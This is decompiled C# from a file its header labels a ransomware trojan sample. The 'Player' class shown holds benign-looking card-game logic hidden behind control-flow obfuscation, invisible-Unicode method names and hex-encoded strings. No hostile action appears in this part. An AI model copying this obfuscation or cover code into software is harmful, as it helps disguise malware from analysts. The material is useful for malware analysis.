// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: AppConte, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7B8B5733-911E-457B-A55E-DDA2927F5FA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-60ba049b8af0c51a8dfbc45cacedef4180000b7739c937d22d8cbd66d4c6a8a8.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 2144177098;
      string str1;
      string str2;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2058043311)) % 12U)
        {
          case 0:
            int num3 = !flag1 ? -1525501515 : (num3 = -369559116);
            num1 = num3 ^ (int) num2 * -1615520582;
            continue;
          case 1:
            str1 = (string) null;
            flag2 = BaseStream == 0;
            num1 = (int) num2 * 1951001533 ^ 929571035;
            continue;
          case 2:
            str1 = "417373656D626C7944656C61795369676E41747472696275";
            num1 = (int) num2 * -2068655577 ^ -1375951731;
            continue;
          case 3:
            flag1 = BaseStream == 1;
            num1 = 454705627;
            continue;
          case 4:
            num1 = (int) num2 * 857879234 ^ 1026767605;
            continue;
          case 5:
            int num4 = !flag2 ? -262153818 : (num4 = -1752570325);
            num1 = num4 ^ (int) num2 * -41502634;
            continue;
          case 6:
            goto label_1;
          case 7:
            str1 = "774834796E66";
            num1 = (int) num2 * -1547982894 ^ -2075075524;
            continue;
          case 9:
            num1 = (int) num2 * 307149351 ^ 78494510;
            continue;
          case 10:
            str2 = str1;
            num1 = 579808219;
            continue;
          case 11:
            num1 = (int) num2 * -1755914313 ^ 1137066241;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 1446335786;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 929758396)) % 5U)
        {
          case 0:
            num1 = (int) num3 * -253446650 ^ -1894060871;
            continue;
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 973936733 ^ -1393179345;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            goto label_1;
          case 4:
            num4 = 0;
            break;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 2039201194;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
label_1:
        int num2 = 1105796701;
        bool flag;
        int num3;
        int index;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 2108223702)) % 13U)
          {
            case 0:
              planningCardsCount = num1;
              num2 = (int) num4 * -1680046602 ^ 1659858065;
              continue;
            case 1:
              index = 0;
              num2 = (int) num4 * 723896276 ^ -1155220960;
              continue;
            case 2:
              num2 = 1335670482;
              continue;
            case 3:
              num2 = (int) num4 * -623581869 ^ -1963109171;
              continue;
            case 5:
              int num5;
              num2 = num5 = index < planningCards.Length ? 1578881688 : (num5 = 351201100);
              continue;
            case 6:
              ++num1;
              num2 = (int) num4 * 1110833674 ^ 184720842;
              continue;
            case 7:
              num3 = planningCards[index];
              num2 = 1579721663;
              continue;
            case 8:
              ++index;
              num2 = (int) num4 * 529062260 ^ -195549752;
              continue;
            case 9:
              num2 = (int) num4 * 433952808 ^ -614671224;
              continue;
            case 10:
              flag = num3 > 0;
              num2 = (int) num4 * 341139249 ^ 331975640;
              continue;
            case 11:
              goto label_1;
            case 12:
              int num6 = flag ? -1110930464 : (num6 = -1419026061);
              num2 = num6 ^ (int) num4 * 1370019965;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 1869695601;
      int planningCard;
      int index;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1722553408)) % 12U)
        {
          case 0:
            num1 = (int) num2 * -1469990620 ^ 777230051;
            continue;
          case 1:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 114251138 ^ -1395599341;
            continue;
          case 2:
            int num3 = planningCard == 0 ? 1425925014 : (num3 = 1021291047);
            num1 = num3 ^ (int) num2 * -2023183197;
            continue;
          case 3:
            planningCard = this.PlanningCards[index];
            num1 = 391128146;
            continue;
          case 4:
            goto label_1;
          case 5:
            str1 = Player.\u206E‬⁯⁭‬‎⁫⁬‬⁯⁫⁮‎⁪⁪‍‌‍⁭‎‪‪⁮‫‪‍‭‫‌⁫‪‎‏‭⁭⁬‪⁭⁬⁬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 2035208291;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * 1949185331 ^ 311456354;
            continue;
          case 7:
            int num4 = flag ? -490759481 : (num4 = -985771362);
            num1 = num4 ^ (int) num2 * -509405016;
            continue;
          case 8:
            num1 = (int) num2 * -2144700592 ^ -2127681066;
            continue;
          case 9:
            flag = index < this.PlanningCards.Length;
            num1 = 905721507;
            continue;
          case 11:
            ++index;
            num1 = 2124399089;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = 1109737590;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 935537501)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -559336308 ^ 310893424;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1394822393;
      int[] numArray;
      int[] planningCards;
      int count;
      int aIndex;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2105145385)) % 10U)
        {
          case 1:
            numArray = new int[count];
            num1 = (int) num2 * -1164365910 ^ -454531363;
            continue;
          case 2:
            num1 = (int) num2 * 1032838502 ^ 965602312;
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -2092013620;
            continue;
          case 4:
            count = json.Count;
            num1 = (int) num2 * 345481108 ^ -326532098;
            continue;
          case 5:
            planningCards = numArray;
            num1 = (int) num2 * -1807570161 ^ -1321134465;
            continue;
          case 6:
            goto label_1;
          case 7:
            num1 = (int) num2 * -933381376 ^ 128239101;
            continue;
          case 8:
            aIndex = 0;
            num1 = (int) num2 * -710882016 ^ -1242541503;
            continue;
          case 9:
            int num3;
            num1 = num3 = aIndex < count ? -116317528 : (num3 = -1172547710);
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 868538472;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1962997569)) % 4U)
        {
          case 1:
            str = Player.\u202A‏‬​⁫‏‭‮⁬‮⁬‌⁭​‫⁪‎‪‭‪⁬⁮‎‎‏⁪⁬⁪‭‪‮⁮​‍⁬​⁬‫‌‭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -394607132 ^ -236521214;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 2013026849 ^ -413211646;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206E‬⁯⁭‬‎⁫⁬‬⁯⁫⁮‎⁪⁪‍‌‍⁭‎‪‪⁮‫‪‍‭‫‌⁫‪‎‏‭⁭⁬‪⁭⁬⁬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202A‏‬​⁫‏‭‮⁬‮⁬‌⁭​‫⁪‎‪‭‪⁬⁮‎‎‏⁪⁬⁪‭‪‮⁮​‍⁬​⁬‫‌‭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
